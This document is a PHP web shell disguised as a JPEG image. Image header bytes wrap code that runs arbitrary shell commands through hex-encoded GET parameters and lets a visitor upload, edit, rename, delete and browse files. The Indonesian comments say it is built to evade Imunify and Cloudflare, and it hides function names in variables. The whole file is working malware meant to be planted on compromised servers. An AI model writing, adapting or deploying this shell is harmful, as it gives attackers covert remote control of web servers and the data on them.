ÿØÿà�JFIF��x�x��ÿþ$·<?php
/*
 * This file just for test for server who using imunify,cloudflare etc,
 *
 * (c) Setsuna Watanabe <yucaerin@hotmail.com>
 *
 * GOOD LUCK, HAVE FUN!
 */

session_start();

// LIST FUNGSI UNTUK BYPASS
$a = 'mk';
$b = 'dir';
$c = $a . $b;
$o = $_POST;
$L = $_GET;
$M = $_SERVER;
$e = $_FILES;
$h = '$command';
$i = 'proc_open';
$j = 'stream_get_contents';
$q = 'file_get_contents';
$s = 'file_put_contents';
$w = 'move_uploaded_file';
$v = 'bin2hex';
$z = 'hex2bin';

$dir = isset($L['dir']) ? $z($L['dir']) : '.';
$files = scandir($dir);
$upload_message = '';
$edit_message = '';
$delete_message = '';

function get_file_permissions($file): string {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function is_writable_permission($file): bool {
    return is_writable($file);
}

function executeCommand($h, $workingDirectory = null)
{
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($h, $descriptorspec, $pipes, $workingDirectory);

    if (is_resource($process)) {
        // Read output from stdout and stderr
        $output_stdout = stream_get_contents($pipes[1]);
        $output_stderr = stream_get_contents($pipes[2]);

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        $return_value = proc_close($process);

        return "Output (stdout):\n" . $output_stdout . "\nOutput (stderr):\n" . $output_stderr;
    } else {
        return "Failed to execute command.";
    }
}

if (isset($L['636d64'])) {
    $h = $z($L['636d64']);
    $result = executeCommand($h, $dir);
}

if (isset($e['file_upload'])) {
    if ($w($e['file_upload']['tmp_name'], $dir . '/' . $e['file_upload']['name'])) {
        $upload_message = 'File berhasil diunggah.';
    } else {
        $upload_message = 'Gagal mengunggah file.';
    }
}

if (isset($o['create_dir'])) {
    $newDirName = $o['new_dir_name'];
    $create_dir_message = createDirectory($dir, $newDirName);
}

// Tampilkan formulir rename
echo '<form action="" method="post">';
echo 'Nama file/direktori lama: <input name="old_name" type="text">';
echo 'Nama baru: <input name="new_name" type="text">';
echo '<input type="submit" value="Ubah Nama">';
echo '</form>';

// Proses form rename jika disubmit
if ($M['REQUEST_METHOD'] === 'POST') {
    if (isset($o['old_name']) && isset($o['new_name'])) {
        $old_name = $o['old_name'];
        $new_name = $o['new_name'];

        $old_path = $dir . '/' . $old_name;
        $new_path = $dir . '/' . $new_name;

        if (rename($old_path, $new_path)) {
            showMessage("Berhasil mengubah nama dari $old_name menjadi $new_name.");
        } else {
            showMessage("Gagal mengubah nama. Pastikan nama file/direktori lama benar.");
        }
    }
}

// Fungsi untuk menampilkan pesan
function showMessage($message)
{
    echo '<p>' . htmlspecialchars($message) . '</p>';
}

if (isset($_POST['edit_file'])) {
    $file = $_POST['edit_file'];
    $content = $q($file);
    if ($content !== false) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Edit File</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 0;
                    text-align: center;
                }
                header {
                    background-color: #4CAF50;
                    color: white;
                    padding: 1rem;
                }
                header h1 {
                    margin: 0;
                }
                main {
                    padding: 1rem;
                }
                form {
                    width: 50%;
                    margin: auto;
                    text-align: left;
                }
                textarea {
                    width: 100%;
                    height: 300px;
                }
                input[type="submit"] {
                    background-color: #4CAF50;
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-top: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }
                input[type="submit"]:hover {
                    background-color: #45a049;
                }
                .btn {
                    background-color: #4CAF50;
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-left: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }

                .btn-download {
                    background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
                    border: none;
                    color: white;
                    cursor: pointer;
                    margin-left: 1rem;
                    padding: 0.5rem 1rem;
                    text-align: center;
                    text-decoration: none;
                    display: inline-block;
                    font-size: 12px;
                }

                .btn:hover {
                    background-color: #45a049;
                }
            </style>
        </head>
        <body>
            <header>
                <h1>Edit File</h1>
            </header>
            <main>
                <form method="post" action="">
                    <textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control"><?php echo htmlspecialchars($content); ?></textarea>
                    <input type="hidden" name="edited_file" value="<?php echo htmlspecialchars($file); ?>">
                    <input type="submit" name="submit_edit" value="Submit">
                </form>
            </main>
        </body>
        </html>
        <?php
        exit;
    } else {
        $edit_message = 'Gagal membaca isi file.';
    }
}

if (isset($_POST['submit_edit'])) {
    $file = $_POST['edited_file'];
    $content = $_POST['file_content'];
    if ($s($file, $content) !== false) {
        $edit_message = 'File berhasil diedit.';
    } else {
        $edit_message = 'Gagal mengedit file.';
    }
}

if (isset($_POST['delete_file'])) {
    $file = $_POST['delete_file'];
    if (unlink($file)) {
        $delete_message = 'File berhasil dihapus.';
    } else {
        $delete_message = 'Gagal menghapus file.';
    }
}

$uname = php_uname();
$current_dir = realpath($dir);

function generateUUID()
{
    return sprintf(
        '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff)
    );
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SIMPEL BANGET NIH SHELL</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        header {
            background-color: #4CAF50;
            color: white;
            padding: 1rem;
        }
        header h1 {
            margin: 0;
        }
        main {
            padding: 1rem;
        }
        table {
            border-collapse: collapse;
            margin: 1rem auto;
            width: 50%;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 0.5rem;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        tr:hover {
            background-color: #ddd;
        }
        form {
            display: inline-block;
            margin: 1rem 0;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        /* Gaya CSS untuk hasil command */
        div {
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            padding: 10px;
            margin-top: 20px;
            overflow: auto;
        }

        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .btn {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }

        .btn-download {
            background-color: #008CBA; /* Ganti warna sesuai kebutuhan */
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }

        .btn:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <header>
        <h1>SIMPEL BANGET NIH SHELL</h1>
    </header>
    <main>
        <p>Current directory: <?php echo $current_dir; ?></p>
        <p>Server information: <?php echo $uname; ?></p>
        <?php if (!empty($upload_message)): ?>
        <p><?php echo $upload_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($edit_message)): ?>
        <p><?php echo $edit_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($delete_message)): ?>
        <p><?php echo $delete_message; ?></p>
        <?php endif; ?>
        <form method="POST" enctype="multipart/form-data">
            <label>Upload file:</label>
            <input type="file" name="file_upload">
            <input type="submit" value="Upload">
            <input type="hidden" name="dir" value="<?php echo $dir; ?>">
        </form>
        <table>
            <tr>
                <th>Filename</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
            <?php foreach ($files as $file): ?>
            <tr>
                <td>
                    <?php if (is_dir($dir . '/' . $file)): ?>
                    <a href="?dir=<?php echo $v($dir . '/' . $file); ?>" style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
                    <?php else: ?>
                    <a href="?dir=<?php echo $v($dir); ?>&editfile=<?php echo $v($file); ?>" style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
                    <?php endif; ?>
                </td>
                <td style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'green' : 'red'; ?>">
                    <?php echo is_file($dir . '/' . $file) ? get_file_permissions($dir . '/' . $file) : (is_writable_permission($dir . '/' . $file) ? 'Directory' : 'Directory (No writable)'); ?>
                </td>
                <td>
                    <?php if (is_file($dir . '/' . $file)): ?>
                    <form action="" method="post" style="display: inline-block;">
                        <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
                        <button type="submit" class="btn btn-download">Edit</button>
                    </form>
                    <form action="" method="post" style="display: inline-block;">
                        <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
                        <button type="submit" class="btn btn-download">Delete</button>
                    </form>
                    <form action="" method="get" style="display: inline-block;">
                        <input type="hidden" name="download" value="<?php echo $v($dir . '/' . $file); ?>">
                        <button type="submit" class="btn btn-download">Download</button>
                    </form>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
        </table>
        <p><b>Command Execution Bypass</b></p>
        <form method="GET">
            <label>encode your command on <b><a href="https://encode-decode.com/bin2hex-decode-online/">https://encode-decode.com/bin2hex-decode-online/</a> :</b></label><br><br>
            <input type="hidden" name="dir" value="<?php echo $v($dir); ?>">
            <input type="text" name="636d64" placeholder="e.g., 6c73306c 616c6c"><br><br>
            <input type="submit" value="Execute">
        </form>
        <?php if (isset($result)): ?>
            <div>
                <h2>Command Result:</h2>
                <pre><?php echo htmlspecialchars($result); ?></pre>
            </div>
        <?php endif; ?>
    </main>
</body>
</html>
ÿÛ�C�		



	
ÿÛ�CÿÀ���"�ÿÄ�����������	
ÿÄ�µ���}�!1AQa"q2¡#B±ÁRÑð$3br	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ��������	
ÿÄ�µ��w�!1AQaq"2B¡±Á	#3RðbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ���?�üÿ�NþÔßôm?ÿ�ðÞjÿ�üEPÿÙ